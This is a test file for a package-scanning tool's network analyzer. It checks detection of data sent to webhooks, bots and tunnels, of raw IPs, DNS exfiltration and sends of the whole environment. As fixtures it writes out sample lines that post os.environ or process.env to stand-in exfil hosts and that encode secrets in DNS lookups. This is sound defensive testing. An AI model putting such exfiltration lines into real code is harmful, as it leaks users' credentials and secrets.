"""network: exfiltration destinations and whole-environment sends.

The service-pattern tests need the service's host name in the text (that is
what the rule matches). They use obviously fake paths and tokens; nothing is
ever contacted.
"""

import pytest
from helpers import fired, npm_pkg, py_pkg, rules, weight_of

from tripwire.analyzers.network import NetworkAnalyzer

A = NetworkAnalyzer()


@pytest.mark.parametrize("url,rule", [
    ("https://discord.com/api/webhooks/0000/FAKE_TOKEN", "discord_webhook"),
    ("https://api.telegram.org/botFAKE_TOKEN/sendMessage", "telegram_bot"),
    ("https://webhook.site/00000000-0000-0000-0000-000000000000", "request_catcher"),
    ("https://fake-sub.ngrok-free.app/c", "tunnel"),
    ("https://pastebin.com/raw/FAKEID", "paste_site"),
])
def test_known_exfil_services(url, rule):
    ev = A.analyze(py_pkg({"p/x.py": f'URL = "{url}"\n'}))
    assert rule in fired(ev)


@pytest.mark.parametrize("host", ["webhook.ſite", "WEBHOOK.SITE", "webhook.sıte".upper()])
def test_case_folding_tricks_do_not_slip_past_the_prefilter(host):
    # re.IGNORECASE matches the long s (U+017F) as "s", and IDNA maps
    # "webhook.ſite" to webhook.site, but "ſ".lower() is still "ſ".
    # The keyword prefilter used plain lower() and skipped the regex.
    ev = A.analyze(npm_pkg(files={"index.js": f'fetch("https://{host}/abc", {{method: "POST"}});\n'}))
    assert "request_catcher" in fired(ev)


def test_fold_covers_every_character_re_ignorecase_maps_to_ascii():
    import re

    from tripwire.analyzers.base import fold
    letter = re.compile(r"[a-z]", re.I)
    for cp in [*range(0x80, 0x3000), 0x212A, 0x212B]:
        c = chr(cp)
        if letter.fullmatch(c):
            assert len(fold(c)) == 1 and "a" <= fold(c) <= "z", hex(cp)


def test_service_in_install_code_weighs_more():
    url = "https://discord.com/api/webhooks/0000/FAKE_TOKEN"
    runtime = weight_of(A.analyze(py_pkg({"p/x.py": f'U = "{url}"\n'})), "discord_webhook")
    install = weight_of(A.analyze(py_pkg({"setup.py": f'U = "{url}"\n'})), "discord_webhook")
    assert install == pytest.approx(runtime + 0.1)


def test_public_raw_ip_url():
    # 203.0.113.0/24 is a documentation range; the rule treats any non-private IP as public
    ev = A.analyze(py_pkg({"p/x.py": 'U = "http://203.0.113.5:8080/up"\n'}))
    assert weight_of(ev, "raw_ip") == 0.45


def test_raw_ip_socket_tuple():
    ev = A.analyze(py_pkg({"p/x.py": 'import socket\nsocket.create_connection(("198.51.100.7", 4444))\n'}))
    assert "raw_ip" in fired(ev)


def test_private_ip_is_context_only():
    ev = A.analyze(py_pkg({"p/x.py": 'ROUTER = "http://192.168.1.1/admin"\n'}))
    assert rules(ev) == {"private_ip"} and fired(ev) == set()


@pytest.mark.parametrize("ip", ["127.0.0.1", "0.0.0.0", "255.255.255.255", "999.1.1.1"])
def test_loopback_and_invalid_ips_are_ignored(ip):
    assert A.analyze(py_pkg({"p/x.py": f'U = "http://{ip}:8000/"\n'})) == []


@pytest.mark.parametrize("code", [
    'import socket\nsocket.gethostbyname(f"{secret}.exfil.example.invalid")\n',
    'import socket\nsocket.gethostbyname(data + ".exfil.example.invalid")\n',
    'import socket\nsocket.gethostbyname("%s.exfil.example.invalid" % data)\n',
    'import socket\nsocket.gethostbyname("{}.exfil.example.invalid".format(data))\n',  # bug fix: literal .format
    'import socket\nsocket.gethostbyname(label.format(data))\n',
])
def test_dns_exfil_python(code):
    assert "dns_exfil" in fired(A.analyze(py_pkg({"p/x.py": code})))


def test_dns_exfil_js_template():
    src = 'const dns = require("dns");\ndns.lookup(`${id}.t.exfil.example.invalid`, () => {});\n'
    assert "dns_exfil" in fired(A.analyze(npm_pkg(files={"index.js": src})))


def test_constant_dns_lookup_is_benign():
    src = 'import socket\nsocket.gethostbyname("example.com")\n'
    assert A.analyze(py_pkg({"p/x.py": src})) == []


def test_variable_dns_lookup_is_benign():
    assert A.analyze(py_pkg({"p/x.py": "import socket\nsocket.gethostbyname(host)\n"})) == []


def test_ordinary_urls_are_ignored():
    src = 'DOCS = "https://example.com/docs"\nAPI = "https://api.example.com/v1"\n'
    assert A.analyze(py_pkg({"p/x.py": src})) == []


def test_docs_and_readme_are_ignored():
    ev = A.analyze(py_pkg({"README.md": "post to https://discord.com/api/webhooks/0/FAKE\n",
                           "docs/guide.rst": "http://203.0.113.5/\n"}))
    assert ev == []


# ------------------------------------------------------------- whole-environment flow

def test_env_sent_direct():
    src = 'import os, requests\nrequests.post("https://exfil.example.invalid", json=dict(os.environ))\n'
    assert weight_of(A.analyze(py_pkg({"p/x.py": src})), "env_sent") == 0.65


def test_env_sent_through_variables():
    src = ("import os, json, urllib.request\n"
           "env = os.environ.copy()\npayload = json.dumps(env).encode()\n"
           "urllib.request.urlopen('https://exfil.example.invalid', data=payload)\n")
    assert "env_sent" in fired(A.analyze(py_pkg({"p/x.py": src})))


def test_env_sent_from_alias_import():
    src = "from os import environ\nimport requests\nrequests.put('https://exfil.example.invalid', data=str(environ))\n"
    assert "env_sent" in fired(A.analyze(py_pkg({"p/x.py": src})))


def test_env_sent_in_install_code_is_stronger():
    src = 'import os, requests\nrequests.post("https://exfil.example.invalid", json=dict(os.environ))\n'
    assert weight_of(A.analyze(py_pkg({"setup.py": src})), "env_sent") == pytest.approx(0.75)


def test_single_env_var_in_header_is_benign():
    src = ('import os, requests\nrequests.get("https://api.example.com", '
           'headers={"Authorization": os.environ["API_TOKEN"]})\n'
           'requests.post("https://api.example.com", data={"k": os.environ.get("KEY")})\n')
    assert A.analyze(py_pkg({"p/x.py": src})) == []


def test_env_passed_to_subprocess_is_not_network():
    src = "import os, subprocess\nsubprocess.run(['make'], env=dict(os.environ, CC='gcc'))\n"
    assert A.analyze(py_pkg({"p/x.py": src})) == []


def test_js_env_body_is_flagged():
    src = 'fetch("https://exfil.example.invalid", { method: "POST", body: JSON.stringify(process.env) });\n'
    assert "env_sent" in fired(A.analyze(npm_pkg(files={"index.js": src})))


def test_js_single_env_var_is_benign():
    src = 'fetch("https://api.example.com", { headers: { authorization: process.env.API_KEY } });\n'
    assert A.analyze(npm_pkg(files={"index.js": src})) == []


def test_js_env_dump_without_network_is_not_network():
    src = "console.log(JSON.stringify(process.env, null, 2));\n"
    assert A.analyze(npm_pkg(files={"cli.js": src})) == []


# ------------------------------------------------------------- false positives found in the live run
# Minimal reconstructions of the patterns, not copies of the packages.

def test_js_env_handed_to_child_process_is_benign():
    src = ('const { spawn } = require("child_process");\n'
           'spawn(cmd, args, { env: { ...process.env, CALL_ID: id } });\n'
           'spawn(cmd, args, { env: process.env });\n'
           'fetch("https://api.example.com/status");\n')
    assert A.analyze(npm_pkg(files={"cli.js": src})) == []


def test_js_env_body_still_flagged_next_to_child_env():
    src = ('spawn(cmd, args, { env: process.env });\n'
           'fetch("https://exfil.example.invalid", { method: "POST", body: JSON.stringify(process.env) });\n')
    assert "env_sent" in fired(A.analyze(npm_pkg(files={"cli.js": src})))


def test_env_alias_in_one_function_does_not_taint_another():
    src = '''import os
import requests


def main(env=None):
    environ = os.environ if env is None else env
    return run(environ)


def upload(store, ctx, name):
    return store.put(ctx, name)


def notify(url, payload):
    requests.post(url, json=payload)
'''
    assert A.analyze(py_pkg({"p/cli.py": src})) == []


def test_single_reads_through_an_env_alias_are_benign():
    src = '''import os, json, urllib.request

environ = os.environ


def send(url):
    payload = {"to": environ.get("NOTIFY_TO", ""), "host": environ["HOSTNAME"]}
    urllib.request.urlopen(urllib.request.Request(url, data=json.dumps(payload).encode()))
'''
    assert A.analyze(py_pkg({"p/notify.py": src})) == []


def test_module_level_alias_sent_from_a_function_is_flagged():
    src = '''import os, requests

ENV = dict(os.environ)


def go():
    requests.post("https://exfil.example.invalid", json=ENV)
'''
    assert "env_sent" in fired(A.analyze(py_pkg({"p/x.py": src})))


def test_parameter_shadows_module_alias():
    src = '''import os, requests

data = dict(os.environ)


def go(data):
    requests.post("https://api.example.com", json=data)
'''
    assert A.analyze(py_pkg({"p/x.py": src})) == []
